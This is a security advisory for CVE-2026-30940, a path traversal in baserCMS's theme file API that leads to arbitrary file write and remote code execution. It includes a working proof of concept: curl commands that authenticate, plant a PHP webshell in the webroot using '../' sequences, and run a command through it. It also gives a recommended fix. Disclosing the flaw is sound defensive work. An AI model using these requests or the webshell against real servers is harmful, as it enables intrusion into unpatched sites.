# [H] baserCMS Path Traversal Leads to Arbitrary File Write and RCE via Theme File API

## Summary
Severity: High
Advisory: GHSA-c5c6-37vq-pjcq
CVE: CVE-2026-30940
CWE: CWE-22, CWE-73
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-31
Source: https://github.com/advisories/GHSA-c5c6-37vq-pjcq
Type: github-advisory

## Affected
- Packagist: `baserproject/basercms` — affected >=0 <5.2.3

## Details
## Summary

A path traversal vulnerability exists in the baserCMS 5.x theme file management API (`/baser/api/admin/bc-theme-file/theme_files/add.json`) that allows arbitrary file write.

An authenticated administrator can include `../` sequences in the `path` parameter to create a PHP file in an arbitrary directory outside the theme directory, which may result in remote code execution (RCE).

## Affected Code

**File**: `plugins/bc-theme-file/src/Service/BcThemeFileService.php`

```php
public function getFullpath(string $theme, string $plugin, string $type, string $path)
{
    // ...
    return $viewPath . $type . DS . $path;  // $path is not sanitized
}
```

## Attack Scenario

1. The attacker compromises an administrator account (password leak, brute force, etc.)
2. Obtains an access token via API login
3. Specifies `path: "../../../../webroot/"` in the theme file creation API
4. A PHP file is created in the webroot
5. The attacker accesses the created PHP file to achieve RCE

## Reproduction Steps

```bash
# 1. Login
curl -X POST "http://target/baser/api/admin/baser-core/users/login.json" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@example.com","password":"password"}'

# 2. Create webshell
curl -X POST "http://target/baser/api/admin/bc-theme-file/theme_files/add.json" \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "theme": "BcThemeSample",
    "plugin": "",
    "type": "layout",
    "path": "../../../../webroot/",
    "base_name": "shell",
    "ext": "php",
    "contents": "<?php system($_GET[\"cmd\"]); ?>"
  }'

# 3. RCE
curl "http://target/shell.php?cmd=id"
```

## Vulnerability Details

| Item | Details |
|------|---------|
| CWE | CWE-22: Path Traversal, CWE-73: External Control of File Name or Path |
| Impact | Arbitrary file write, Remote Code Execution (RCE) |
| Attack Prerequisites | Administrator privileges + API enabled (`USE_CORE_ADMIN_API=true`), or chaining with XSS, etc. |
| Reproducibility | High (PoC verified) |
| Test Environment | baserCMS 5.x (Docker environment) |

### Additional Notes on Attack Prerequisites

- **When API is enabled** (`USE_CORE_ADMIN_API=true`): API calls can be made externally using JWT token authentication. Direct exploitation is possible.
- **Default settings** (`USE_CORE_ADMIN_API=false`): Direct external API calls are prohibited. CSRF protection is also active, so this vulnerability alone cannot be exploited. An exploit chain involving XSS or similar is required.

## Recommended Fix

Rather than relying on simple string replacement or blacklist checks of input, the canonicalized path (using `realpath()`, etc.) should be verified to be within the theme base directory after file creation or immediately before writing. If the path falls outside the boundary, the operation should be rejected.

The specific implementation location and method are left to the project's design decisions.

## Comparison with Other CMS

WordPress's theme editor only allows editing within `wp-content/themes/` and does not permit writes outside that directory. [CVE-2019-8943](https://www.sonarsource.com/blog/wordpress-image-remote-code-execution/) was reported as a path traversal vulnerability in `wp_crop_image()` that allowed writing cropped image output to an arbitrary directory by including `../` in the filename.

This vulnerability is not a matter of "administrators being able to execute arbitrary code" by design, but rather stems from a security boundary violation where "the theme editing function can write outside the theme directory (to webroot, config, etc.)."

## Resources

- OWASP Path Traversal: <https://owasp.org/www-community/attacks/Path_Traversal>
- WordPress RCE via Path Traversal (CVE-2019-8943): <https://www.sonarsource.com/blog/wordpress-image-remote-code-execution/>
- Jira Path Traversal (CVE-2025-22167): <https://nvd.nist.gov/vuln/detail/CVE-2025-22167>

This advisory was translated from Japanese to English using GitHub Copilot.

## References
- https://github.com/baserproject/basercms/security/advisories/GHSA-c5c6-37vq-pjcq
- https://nvd.nist.gov/vuln/detail/CVE-2026-30940
- https://basercms.net/security/JVN_20837860
- https://github.com/baserproject/basercms
- https://github.com/baserproject/basercms/releases/tag/5.2.3
